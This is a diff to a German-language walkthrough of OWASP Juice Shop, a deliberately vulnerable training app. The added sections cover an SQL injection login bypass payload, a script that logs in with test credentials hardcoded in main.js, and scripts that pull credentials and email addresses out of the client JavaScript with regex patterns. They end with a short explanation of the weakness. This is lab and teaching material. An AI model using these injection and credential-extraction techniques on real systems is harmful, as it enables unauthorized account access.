@@ -16,6 +16,196 @@ Passwort: (beliebig)
 - Der Rest der Query (Passwort-Überprüfung) wird als Kommentar ignoriert
 - Resultierende Query: `SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'`
 
+### 🔍 Alternative: Test Credentials aus main.js
+
+```javascript
+// Hardcoded Test-Credentials in der main.js gefunden
+const testingUsername = "testing@juice-sh.op";
+const testingPassword = "IamUsedForTesting";
+
+// Einfacher Login mit Test-Account
+function loginWithTestCredentials() {
+    console.log('🧪 Using hardcoded test credentials from main.js...');
+    
+    // Navigiere zur Login-Seite
+    window.location.hash = '#/login';
+    
+    // Warte bis Seite geladen ist
+    setTimeout(() => {
+        const emailField = document.querySelector('input[type="email"]');
+        const passwordField = document.querySelector('input[type="password"]');
+        const loginButton = document.querySelector('button[type="submit"]');
+        
+        if (emailField && passwordField && loginButton) {
+            // Fülle Test-Credentials ein
+            emailField.value = testingUsername;
+            passwordField.value = testingPassword;
+            
+            // Triggere Events für Angular
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+            passwordField.dispatchEvent(new Event('input', { bubbles: true }));
+            
+            console.log('📧 Email:', testingUsername);
+            console.log('🔐 Password:', testingPassword);
+            
+            // Submit Login
+            loginButton.click();
+            
+            console.log('✅ Login attempted with test credentials');
+        } else {
+            console.log('❌ Login form elements not found');
+        }
+    }, 1000);
+}
+
+// Execute test login
+loginWithTestCredentials();
+```
+
+### 🔍 Hardcoded Credentials Discovery
+
+```javascript
+// Suche nach weiteren hardcoded Credentials in main.js
+fetch('http://localhost:3000/main.js')
+.then(response => response.text())
+.then(code => {
+    console.log('🔍 Searching for hardcoded credentials...');
+    
+    // Pattern für häufige Credential-Variablen
+    const credentialPatterns = [
+        /testingUsername\s*=\s*["']([^"']+)["']/g,
+        /testingPassword\s*=\s*["']([^"']+)["']/g,
+        /defaultUser\s*=\s*["']([^"']+)["']/g,
+        /defaultPass\s*=\s*["']([^"']+)["']/g,
+        /adminUser\s*=\s*["']([^"']+)["']/g,
+        /adminPass\s*=\s*["']([^"']+)["']/g,
+        /username\s*:\s*["']([^"']+)["']/g,
+        /password\s*:\s*["']([^"']+)["']/g
+    ];
+    
+    credentialPatterns.forEach((pattern, index) => {
+        const matches = code.match(pattern);
+        if (matches) {
+            console.log(`🔑 Credential Pattern ${index}:`, matches);
+        }
+    });
+    
+    // Spezifische Suche nach bekannten Test-Accounts
+    const emailPattern = /["'][^"']*@juice-sh\.op["']/g;
+    const emails = code.match(emailPattern);
+    if (emails) {
+        console.log('📧 Found email addresses:', [...new Set(emails)]);
+    }
+    
+    // Suche nach "testing" related strings
+    const testingPattern = /["'][^"']*testing[^"']*["']/gi;
+    const testingStrings = code.match(testingPattern);
+    if (testingStrings) {
+        console.log('🧪 Testing related strings:', [...new Set(testingStrings)]);
+    }
+});
+```
+
+### 🎯 Vollständige Credential Enumeration
+
+```javascript
+// Automatische Extraktion aller Credentials aus main.js
+async function extractAllCredentials() {
+    console.log('🕵️ Starting credential extraction from main.js...');
+    
+    try {
+        const response = await fetch('http://localhost:3000/main.js');
+        const jsCode = await response.text();
+        
+        const credentials = {
+            testing: {
+                username: null,
+                password: null
+            },
+            admin: {
+                username: null,
+                password: null
+            },
+            others: []
+        };
+        
+        // Extrahiere Testing Credentials
+        const testingUserMatch = jsCode.match(/testingUsername\s*=\s*["']([^"']+)["']/);
+        const testingPassMatch = jsCode.match(/testingPassword\s*=\s*["']([^"']+)["']/);
+        
+        if (testingUserMatch) {
+            credentials.testing.username = testingUserMatch[1];
+            console.log('🧪 Testing Username:', testingUserMatch[1]);
+        }
+        
+        if (testingPassMatch) {
+            credentials.testing.password = testingPassMatch[1];
+            console.log('🧪 Testing Password:', testingPassMatch[1]);
+        }
+        
+        // Suche nach weiteren Email-Adressen
+        const allEmails = jsCode.match(/["'][^"']*@[^"']+["']/g);
+        if (allEmails) {
+            const uniqueEmails = [...new Set(allEmails.map(email => email.replace(/['"]/g, '')))];
+            console.log('📧 All found emails:', uniqueEmails);
+            
+            // Filtere juice-sh.op Emails
+            const juiceEmails = uniqueEmails.filter(email => email.includes('juice-sh.op'));
+            console.log('🧃 Juice Shop emails:', juiceEmails);
+            
+            credentials.others = juiceEmails;
+        }
+        
+        // Test Login mit gefundenen Credentials
+        if (credentials.testing.username && credentials.testing.password) {
+            console.log('✅ Complete testing credentials found!');
+            console.log('📋 Credentials:', credentials.testing);
+            
+            // Automatischer Login-Test
+            await testLogin(credentials.testing.username, credentials.testing.password);
+        }
+        
+        return credentials;
+        
+    } catch (error) {
+        console.error('❌ Error extracting credentials:', error);
+    }
+}
+
+// Test Login Function
+async function testLogin(username, password) {
+    console.log(`🔐 Testing login: ${username} / ${password}`);
+    
+    // Hier würde normalerweise ein Login-Request gesendet werden
+    // In der Browser-Console kann man das Formular direkt ausfüllen
+    
+    console.log('💡 Manual steps:');
+    console.log('1. Navigate to /#/login');
+    console.log(`2. Enter email: ${username}`);
+    console.log(`3. Enter password: ${password}`);
+    console.log('4. Click login button');
+}
+
+// Starte Credential Extraction
+extractAllCredentials();
+```
+
+### 🚨 Sicherheitslücke: Information Disclosure
+
+- **Schwachstelle**: Hardcoded Credentials in Client-Code
+- **Impact**: Direkter Zugang zu Test-Account
+- **CVSS**: Medium (Credential Exposure)
+- **Gefundene Credentials**:
+  - Username: `testing@juice-sh.op`
+  - Password: `IamUsedForTesting`
+
+### 🛡️ Warum ist das problematisch?
+
+1. **Client-Side Exposure**: Credentials sind für jeden sichtbar
+2. **No Obfuscation**: Klartext in JavaScript-Code
+3. **Production Risk**: Test-Accounts könnten in Produktion existieren
+4. **Privilege Escalation**: Test-Account könnte erweiterte Rechte haben
+
 ---
 
 ## 2. JWT Token Dekodierung - Admin Passwort via localStorage
